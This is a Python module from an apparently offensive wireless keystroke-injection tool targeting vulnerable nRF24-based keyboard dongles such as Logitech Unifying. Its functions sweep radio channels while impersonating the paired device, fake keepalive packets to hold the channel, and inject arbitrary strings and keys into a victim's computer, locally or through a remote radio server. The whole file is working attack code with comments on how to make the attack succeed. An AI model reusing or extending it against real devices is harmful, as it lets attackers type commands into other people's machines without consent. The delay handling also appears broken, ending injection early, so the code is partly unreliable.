"""
This file contains utilities related to injection - function for channel sweeping, generic injection function, string injection function, etc.
"""

# no problem doing relative imports since this file should not be executed
import time
from .general_utils import *
from .hid_scan_codes import *
from .vendors import logitech

def find_frequency_channel(radio, timeout=4, retransmits=15):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    assuming the radio was already configured with the RF address of the vulnerable device (by calling enter_sniffer_mode()).
    It may also receive additional parameters to be passed to the transmit_payload() call (as required for sniffing, for example).
    It identifies the frequency channel used by the victim dongle to communicate with that device, by pretending to be that device
    and repeatedly sending an arbitrary "ping" payload to the victim dongle, using a different channel each time.
    The function continues with this process until an ACK is received from the dongle, meaning we found the right channel.
    It returns the channel if one was found, and None otherwise.
    This step has to be performed before any attack, since the attacking dongle must be on the same channel as the victim dongle in order to communicate with it.
    """

    print('pinging...')
    
    # The nRF24LU1 chip provides 126 channels of 1MHz from 2400MHz to 2525MHz, so the channel parameter can be between 0 and 125 (inclusive).
    # But we don't need to scan all of these channels - the MouseJack whitepaper contains a Radio Configuration table for each affected vendor.
    # The tables contain the range of channels used by each vendor. The smallest used frequency among all vendors is 2402, and the greatest one
    # is 2481. So we can expect the channels to be between 2 and 81, thus reducing scanning time (for Logitech Unifying, the bound is even tighter -
    # 2402 - 2474).
    # To be more safe, an upper bound of 84 is used, based on: https://github.com/BastilleResearch/nrf-research-firmware/blob/master/tools/lib/common.py#L33
    for channel in CHANNELS:
        radio.set_channel(channel)
        if radio.transmit_payload(PING_PAYLOAD, timeout, retransmits): # transmitting the payload; the function returns true if a response was received
            print(f'found channel: {channel}')
            return channel
    return None


def add_key_releases(keystrokes):
    """
    This function receives a list of keystrokes (meaning a list where each element is a list of the form: [scan_code, modifier])
    that are about to be injected to a vulnerable dongle.
    It tries to find consecutive pairs of keystrokes (meaning, one is to be transmitted immediately after the other) where,
    if we would type them on a keyboard in real life, we would press the same physical key (twice in a row).
    In this case, the vulnerable dongle would not tell the target computer that the key was pressed twice, unless a key release packet is placed between the original two.
    So this function adds key release packets wherever necessary.
    To indicate whether two consecutive keys with the same PHYSICAL LOCATION are pressed, we need to compare their scan codes ONLY and not their modifiers,
    because scan codes correspond to the physical location of a key on the keyboard, NOT what it says on the key itself.
    For example, the sequence 'gG' is considered as pressing the same key twice in a row, since 'g' and 'G' have the same scan code,
    even though their modifiers are different.
    """
    new_keystrokes = []
    for i in range(len(keystrokes) - 1): # in order to not go out of range
        new_keystrokes.append(keystrokes[i]) # copying each keystroke from the original list
        if keystrokes[i][0] == keystrokes[i + 1][0]: # checking if the next keystroke has the same scan code
            new_keystrokes.append([KEY_RELEASE, KEY_MOD_NONE]) # adding a key release 
    new_keystrokes.append(keystrokes[-1]) # copying the last keystroke
    return new_keystrokes


def inject_keystrokes(radio, keystrokes, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a list of keystrokes (meaning a list where each element is a list of the form: [scan_code, modifier]),
    and a vendor. The function performs a keystroke injection attack against a vulnerable dongle of the given vendor.
    """

    if len(keystrokes) == 0:
        return # no keystrokes to inject...
    
    """
    For Logitech, there is an issue we need to address - the dongle and paired device could move to a different channel while injecting the keystrokes,
    thus breaking the attack. According to the whitepaper, they remain on the same channel as long as there is no packet loss. To indicate this, the device
    sends periodic keepalive packets to its dongle. It has to do so within a known interval/timeout, which is set by the device. If the timeout has passed without
    the dongle receiving a keepalive packet from the device, they move to a different channel. In addition, even if all keepalives are delivered on time, but the device is idle,
    the keepalive interval/timeout is increased every once in a while. But that's less important.
    The whitepaper states that in order to perform a successful attack, "an attacker needs to mimic the keepalive behavior used by Unifying keyboards and mice".
    So we first send the dongle a packet that sets a relatively long keepalive timeout, and later transmit keepalives very frequently. This way we can be confident
    that there won't be a timeout that would cause the dongle to switch channels unexpectedly.
    """
    if vendor == logitech:
        radio.transmit_payload(logitech.SET_KEEPALIVE_TIMEOUT_PAYLOAD) # transmitting payload that sets the keepalive timeout
        time.sleep(logitech.DELAY_BETWEEN_TRANSMISSIONS) # waiting before the next transmission

    for scan_code, modifier in keystrokes:
        # special case - DELAY invoked from DuckyScript parser (modifier is the interval in ms)
        if scan_code == KEY_DELAY:
            # Transmitting delay_interval/10 keepalive packets with a delay of 10ms between each other,
            # to achieve a total delay of delay_interval ms without losing the channel.
            for i in range(modifier // 10):
                radio.transmit_payload(vendor.KEEPALIVE_PAYLOAD)
                time.sleep(10 / 1000)
            return

        radio.transmit_payload(vendor.build_frame(scan_code, modifier)) # transmit the proper frame
        time.sleep(vendor.DELAY_BETWEEN_TRANSMISSIONS / 2) # waiting before the next transmission
        radio.transmit_payload(vendor.KEEPALIVE_PAYLOAD) # transmit keepalive

    # we have to transmit a key release at the end, otherwise it would keep typing the last key forever
    radio.transmit_payload(vendor.build_frame(KEY_RELEASE))


def transmit_string(radio, s, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a string to be injected and the vendor of the vulnerable device. It injects the string to the victim.
    """
    keystrokes = [printable_characters[char] for char in s] # using the printable_characters dictionary from hid_scan_codes.py to get a list of keystrokes matching the characters
    inject_keystrokes(radio, add_key_releases(keystrokes), vendor) # injecting keystrokes, adding key release packets using the utility function if necessary


def transmit_keys(radio, keys, vendor=logitech):
    """
    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
    a list of keys to be injected and the vendor of the vulnerable device. It injects the keys to the victim, one by one.
    Important note: only multimedia keys or keys that don't produce a character are allowed. For printable characters, use transmit_string().
    """
    keystrokes = [other_keys[name] for name in keys if name in other_keys.keys()] # using the other_keys dictionary (that's why characters are not allowed), eliminating key names that aren't in the dictionary
    inject_keystrokes(radio, add_key_releases(keystrokes), vendor) # injecting keystrokes, adding key release packets using the utility function if necessary


def try_transmit(radio, frame):
    """
    This function receives a frame and tries to transmit it until success. Reliability is important for: 1. Live mode  2. DoS DuckyScript
    """
    if radio.transmit_payload(frame): # first try, if it doesn't work then try once again
        return
    while not radio.transmit_payload(frame): # continue as long as it still doesn't work
        while not find_frequency_channel(radio): # starting from the second try, search for the frequency channel (which was most likely changed) every time a transmission fails
            pass
